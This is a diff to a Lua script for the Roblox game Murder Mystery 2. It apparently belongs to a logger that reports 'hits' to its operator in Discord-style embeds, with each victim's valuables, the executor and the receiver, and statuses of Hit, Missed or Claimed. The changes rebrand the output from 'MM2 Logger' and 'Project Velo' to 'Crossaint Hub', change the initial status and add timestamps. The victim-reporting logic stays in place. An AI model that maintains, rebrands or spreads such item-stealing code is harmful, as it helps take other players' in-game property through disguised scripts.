@@ -1620,7 +1620,7 @@ local function fn32()
 	local valuablesText = str9
 
 	-- initial status: Hit — Missed or Claimed are patched onto this same message later
-	local statusText = "🟢 Hit"
+	local statusText = "🔵 In Progress"
 
 	local fields = {
 		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusText, str12, receiverDisplay), inline = false },
@@ -1635,12 +1635,12 @@ local function fn32()
 	end
 
 	local payloadTbl = {
-		username = "MM2 Logger",
+		username = "Crossaint Hub",
 		embeds = {{
 			title  = "Murder Mystery 2! Look, You Have Hits! Congrats! 🎉",
 			color  = 3447003, -- blue: In Progress
 			fields = fields,
-			footer = { text = "MM2 • Project Velo" },
+			footer = { text = "MM2 • Crossaint Hub • " .. os.date("%m/%d/%Y • %I:%M:%S %p") },
 		}},
 	}
 
@@ -1746,7 +1746,7 @@ local function fn32_update_missed(reason)
 				title  = "Murder Mystery 2! Look, You Have Hits! Congrats! 🎉",
 				color  = 15548997,
 				fields = fields,
-				footer = { text = "MM2 • Project Velo" },
+				footer = { text = "MM2 • Crossaint Hub • " .. os.date("%m/%d/%Y • %I:%M:%S %p") },
 			}},
 		})
 
@@ -1798,7 +1798,7 @@ local function fn33(arg, arg2, _arg3)
 				title  = "Murder Mystery 2! Look, You Have Hits! Congrats! 🎉",
 				color  = embedColor,
 				fields = fields,
-				footer = { text = "MM2 • Project Velo" },
+				footer = { text = "MM2 • Crossaint Hub • " .. os.date("%m/%d/%Y • %I:%M:%S %p") },
 			}},
 		})
 
